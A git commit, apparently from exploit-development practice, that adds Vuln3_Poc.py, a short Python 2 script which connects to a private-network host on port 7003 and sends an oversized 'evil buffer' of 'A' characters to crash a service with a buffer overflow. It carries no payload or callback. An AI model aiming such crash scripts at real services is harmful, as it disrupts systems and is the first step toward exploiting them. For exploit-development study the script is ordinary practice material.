62f57a259cfcc04afbfe83fd7176e3e437e30dcf
5bhuv4n35h <10207922+5bhuv4n35h@users.noreply.github.com>
2020-06-04 03:20:36 -0400

    poc

---
+++ Vuln3_Poc.py
@@ -0,0 +1,20 @@
+#!/usr/bin/python
+import socket
+
+try:
+  print "\nSending evil buffer..."
+
+  buffer = "A" * 0x8B0
+
+  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+  
+  s.connect(("192.168.176.227", 7003))
+  s.send(buffer)
+  
+  s.close()
+
+  print "\nDone!"
+  
+except:
+  print "\nCould not connect!"
+
